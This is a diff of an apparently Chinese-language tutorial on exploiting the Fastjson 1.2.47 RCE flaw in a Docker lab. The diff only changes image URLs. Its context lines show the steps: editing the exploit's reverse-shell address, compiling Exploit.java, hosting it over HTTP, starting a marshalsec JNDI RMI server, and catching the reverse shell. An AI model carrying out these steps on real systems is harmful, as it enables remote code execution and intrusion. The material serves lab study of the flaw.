@@ -42,13 +42,13 @@ Java语言中常用的Json处理主要是Fastjson和Jackson，相对而言，Jac
 
 这里用的docker环境
 
-<img src="https://image.geoer.cn/fj1.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj1.jpg"></img>
 
 
 
 1.查看数据包，可以用上面的`漏洞检测`的方法来判断
 
-<img src="https://image.geoer.cn/fj2.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj2.jpg"></img>
 
 
 
@@ -66,7 +66,7 @@ EXP地址：https://github.com/CaijiOrz/fastjson-1.2.47-RCE
 
 3.修改exp中反弹shell的服务器地址和为我们的
 
-<img src="https://image.geoer.cn/fj3.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj3.jpg"></img>
 
 
 
@@ -76,7 +76,7 @@ EXP地址：https://github.com/CaijiOrz/fastjson-1.2.47-RCE
 javac Exploit.java
 ```
 
-<img src="https://image.geoer.cn/fj4.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj4.jpg"></img>
 
 
 
@@ -86,7 +86,7 @@ javac Exploit.java
 python -m SimpleHTTPServer 8080
 ```
 
-<img src="https://image.geoer.cn/fj5.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj5.jpg"></img>
 
 6.执行下面的命令开启RMI/LDAP服务
 
@@ -95,7 +95,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 ```
 
-<img src="https://image.geoer.cn/fj6.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj6.jpg"></img>
 
 
 
@@ -144,13 +144,13 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 Content-type: application/json
 ```
 
-<img src="https://image.geoer.cn/fj7.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj7.jpg"></img>
 
 
 
 9.接收到反弹回来的shell
 
-<img src="https://image.geoer.cn/fj8.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/fj8.jpg"></img>
 
 
 
